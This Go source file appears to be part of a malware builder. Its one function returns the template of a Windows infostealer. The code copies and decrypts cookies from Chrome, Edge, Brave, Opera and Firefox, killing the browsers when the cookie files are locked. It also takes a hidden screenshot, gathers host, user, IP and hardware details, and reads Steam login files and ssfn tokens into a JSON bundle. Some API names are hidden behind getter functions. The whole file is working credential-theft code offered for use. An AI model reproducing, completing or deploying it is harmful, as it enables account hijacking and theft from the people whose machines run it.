package buildergen

import "strings"

func templateStealer() string {
	return strings.TrimSpace(`


func runStealer() string {
	results := map[string]string{}
	var diagErrors []string
	var killedBrowsers []string

	browsers := []struct {
		name  string
		paths []string
		exe   string
	}{
		{"Chrome", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		}, "chrome.exe"},
		{"Edge", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		}, "msedge.exe"},
		{"Brave", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		}, "brave.exe"},
		{"Opera", []string{
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
		}, "opera.exe"},
		{"Firefox", []string{
			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		}, "firefox.exe"},
	}

	for _, br := range browsers {
		for _, basePath := range br.paths {
			if _, err := os.Stat(basePath); os.IsNotExist(err) {
				continue
			}

			var cookies string
			var errs []string
			if br.name == "Firefox" {
				cookies, errs = stealFirefoxCookies(basePath)
			} else {
				cookies, errs = stealChromiumCookies(basePath, br.name)
			}
			diagErrors = append(diagErrors, errs...)

			if cookies != "" {
				if prev, ok := results[br.name]; ok {
					results[br.name] = prev + "\n" + cookies
				} else {
					results[br.name] = cookies
				}
				found := false
				for _, k := range killedBrowsers {
					if k == br.exe { found = true; break }
				}
				if !found { killedBrowsers = append(killedBrowsers, br.exe) }
			}
		}
	}

	for _, exe := range killedBrowsers {
		cmd := exec.Command("cmd", "/c", "start", "", exe)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
	}

	if scr := stealScreenshot(); scr != "" {
		results["_screenshot"] = scr
	}

	if info := stealUserInfo(); info != "" {
		results["_userinfo"] = info
	}

	if steam := stealSteamTokens(); steam != "" {
		results["_steam"] = steam
	}

	if len(diagErrors) > 0 {
		results["_errors"] = strings.Join(diagErrors, "; ")
	}

	if len(results) == 0 {
		results["_errors"] = "no data collected"
	}

	out, _ := json.Marshal(results)
	return string(out)
}

func stealChromiumCookies(userDataPath string, browserName string) (string, []string) {
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
	var allCookies strings.Builder
	var errs []string

	for _, profile := range profiles {
		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			cookiePath = filepath.Join(userDataPath, profile, "Cookies")
			if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
				continue
			}
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s query: %v", browserName, profile, err))
			db.Close()
			continue
		}

		rowCount := 0
		for rows.Next() {
			var host, name, path string
			var encValue []byte
			var expires int64
			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
				errs = append(errs, fmt.Sprintf("%s/%s scan: %v", browserName, profile, err))
				continue
			}
			rowCount++

			value := decryptCookieValue(encValue, userDataPath)

			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expires))
		}
		rows.Close()
		db.Close()

		if rowCount == 0 {
			errs = append(errs, fmt.Sprintf("%s/%s: 0 rows", browserName, profile))
		}
	}

	return allCookies.String(), errs
}

func stealFirefoxCookies(profilesPath string) (string, []string) {
	var allCookies strings.Builder
	var errs []string

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return "", []string{"firefox readdir: " + err.Error()}
	}

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		cookiePath := filepath.Join(profilesPath, e.Name(), "cookies.sqlite")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			continue
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s query: %v", e.Name(), err))
			db.Close()
			continue
		}

		for rows.Next() {
			var host, name, path, value string
			var expiry int64
			if err := rows.Scan(&host, &name, &path, &value, &expiry); err != nil {
				errs = append(errs, fmt.Sprintf("firefox/%s scan: %v", e.Name(), err))
				continue
			}
			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expiry))
		}
		rows.Close()
		db.Close()
	}

	return allCookies.String(), errs
}

func stealScreenshot() string {
	user32 := syscall.NewLazyDLL(getUser32DLL())
	gdi32 := syscall.NewLazyDLL(getGdi32DLL())
	getDesktopWindow := user32.NewProc(getGetDesktopWindowName())
	getDC := user32.NewProc(getGetDCName())
	releaseDC := user32.NewProc(getReleaseDCName())
	createCompatibleDC := gdi32.NewProc(getCreateCompatibleDCName())
	createCompatibleBitmap := gdi32.NewProc(getCreateCompatibleBitmapName())
	selectObject := gdi32.NewProc(getSelectObjectName())
	bitBlt := gdi32.NewProc(getBitBltName())
	getDeviceCaps := gdi32.NewProc(getGetDeviceCapsName())
	deleteDC := gdi32.NewProc(getDeleteDCName())
	deleteObject := gdi32.NewProc(getDeleteObjectName())
	getDIBits := gdi32.NewProc(getGetDIBitsName())

	hwnd, _, _ := getDesktopWindow.Call()
	hdc, _, _ := getDC.Call(hwnd)
	if hdc == 0 {
		return ""
	}
	defer releaseDC.Call(hwnd, hdc)

	width, _, _ := getDeviceCaps.Call(hdc, 8)
	height, _, _ := getDeviceCaps.Call(hdc, 10)
	if width == 0 || height == 0 {
		return ""
	}

	memDC, _, _ := createCompatibleDC.Call(hdc)
	if memDC == 0 {
		return ""
	}
	defer deleteDC.Call(memDC)

	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, width, height)
	if hBitmap == 0 {
		return ""
	}
	defer deleteObject.Call(hBitmap)

	selectObject.Call(memDC, hBitmap)
	bitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)

	type bitmapInfoHeader struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}

	bi := bitmapInfoHeader{
		BiSize:     40,
		BiWidth:    int32(width),
		BiHeight:   -int32(height),
		BiPlanes:   1,
		BiBitCount: 32,
	}

	dataSize := int(width) * int(height) * 4
	pixelData := make([]byte, dataSize)
	getDIBits.Call(memDC, hBitmap, 0, height, uintptr(unsafe.Pointer(&pixelData[0])), uintptr(unsafe.Pointer(&bi)), 0)

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			off := (y*int(width) + x) * 4
			if off+3 < len(pixelData) {
				img.Pix[(y*int(width)+x)*4+0] = pixelData[off+2]
				img.Pix[(y*int(width)+x)*4+1] = pixelData[off+1]
				img.Pix[(y*int(width)+x)*4+2] = pixelData[off+0]
				img.Pix[(y*int(width)+x)*4+3] = 255
			}
		}
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 70}); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func stealUserInfo() string {
	hostname, _ := os.Hostname()
	username := getUserName()
	ip := getPublicIP()
	country := getCountryByIP(ip)

	osName := ""
	cpuName := ""
	gpuName := ""
	ramSize := ""

	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetOs()).Output(); err == nil {
		osName = strings.TrimSpace(string(o))
	}
	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetCpu()).Output(); err == nil {
		cpuName = strings.TrimSpace(string(o))
	}
	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetGpu()).Output(); err == nil {
		gpuName = strings.TrimSpace(string(o))
	}
	if o, err := exec.Command(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetRam()).Output(); err == nil {
		ramBytes := strings.TrimSpace(string(o))
		if v, err := strconv.ParseInt(ramBytes, 10, 64); err == nil {
			ramSize = fmt.Sprintf("%d GB", v/1024/1024/1024)
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))
	sb.WriteString(fmt.Sprintf("Username: %s\n", username))
	sb.WriteString(fmt.Sprintf("IP: %s\n", ip))
	sb.WriteString(fmt.Sprintf("Country: %s\n", country))
	sb.WriteString(fmt.Sprintf("OS: %s\n", osName))
	sb.WriteString(fmt.Sprintf("CPU: %s\n", cpuName))
	sb.WriteString(fmt.Sprintf("GPU: %s\n", gpuName))
	sb.WriteString(fmt.Sprintf("RAM: %s\n", ramSize))
	return sb.String()
}

func stealSteamTokens() string {
	steamPaths := []string{
		filepath.Join(os.Getenv("ProgramFiles(x86)"), "Steam"),
		filepath.Join(os.Getenv("ProgramFiles"), "Steam"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam"),
	}

	var sb strings.Builder
	for _, steamDir := range steamPaths {
		if _, err := os.Stat(steamDir); os.IsNotExist(err) {
			continue
		}

		loginFile := filepath.Join(steamDir, "config", "loginusers.vdf")
		if data, err := os.ReadFile(loginFile); err == nil {
			sb.WriteString("=== loginusers.vdf ===\n")
			sb.WriteString(string(data))
			sb.WriteString("\n\n")
		}

		configFile := filepath.Join(steamDir, "config", "config.vdf")
		if data, err := os.ReadFile(configFile); err == nil {
			sb.WriteString("=== config.vdf ===\n")
			sb.WriteString(string(data))
			sb.WriteString("\n\n")
		}

		entries, err := os.ReadDir(steamDir)
		if err == nil {
			for _, e := range entries {
				if strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
					ssfnPath := filepath.Join(steamDir, e.Name())
					if data, err := os.ReadFile(ssfnPath); err == nil {
						sb.WriteString(fmt.Sprintf("=== %s ===\n", e.Name()))
						sb.WriteString(encoding_base64.StdEncoding.EncodeToString(data))
						sb.WriteString("\n\n")
					}
				}
			}
		}
		break
	}
	return sb.String()
}

func decryptCookieValue(encValue []byte, userDataPath string) string {
	if len(encValue) == 0 {
		return ""
	}

	if len(encValue) > 3 && string(encValue[:3]) == "v10" {
		localStatePath := filepath.Join(userDataPath, "Local State")
		key := getChromiumKey(localStatePath)
		if key == nil {
			return "(encrypted)"
		}
		nonce := encValue[3:15]
		ciphertext := encValue[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return "(encrypted)"
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "(encrypted)"
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "(encrypted)"
		}
		return string(plain)
	}

	out, err := dpapiDecrypt(encValue)
	if err != nil {
		return "(encrypted)"
	}
	return string(out)
}

var chromiumKeyCache = map[string][]byte{}
var chromiumKeyCacheMu sync.Mutex

func getChromiumKey(localStatePath string) []byte {
	chromiumKeyCacheMu.Lock()
	defer chromiumKeyCacheMu.Unlock()

	if k, ok := chromiumKeyCache[localStatePath]; ok {
		return k
	}

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}

	osCrypt, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}
	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil
	}

	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return nil
	}
	encKey = encKey[5:]

	key, err := dpapiDecrypt(encKey)
	if err != nil {
		return nil
	}

	chromiumKeyCache[localStatePath] = key
	return key
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	proc := crypt32.NewProc("CryptUnprotectData")

	inBlob := cryptDataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	var outBlob cryptDataBlob

	r, _, err := proc.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer func() {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		localFree := kernel32.NewProc("LocalFree")
		_, _, _ = localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	}()

	result := make([]byte, outBlob.cbData)
	copy(result, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return result, nil
}

func copyFileLocked(src, dst string) error {
	data, err := os.ReadFile(src)
	if err == nil && len(data) > 0 {
		return os.WriteFile(dst, data, 0o644)
	}

	for _, proc := range []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"} {
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Run()
	}
	time.Sleep(500 * time.Millisecond)

	data, err = os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("read after kill %s: %v", src, err)
	}
	if len(data) == 0 {
		return fmt.Errorf("empty after kill %s", src)
	}
	return os.WriteFile(dst, data, 0o644)
}
`)
}
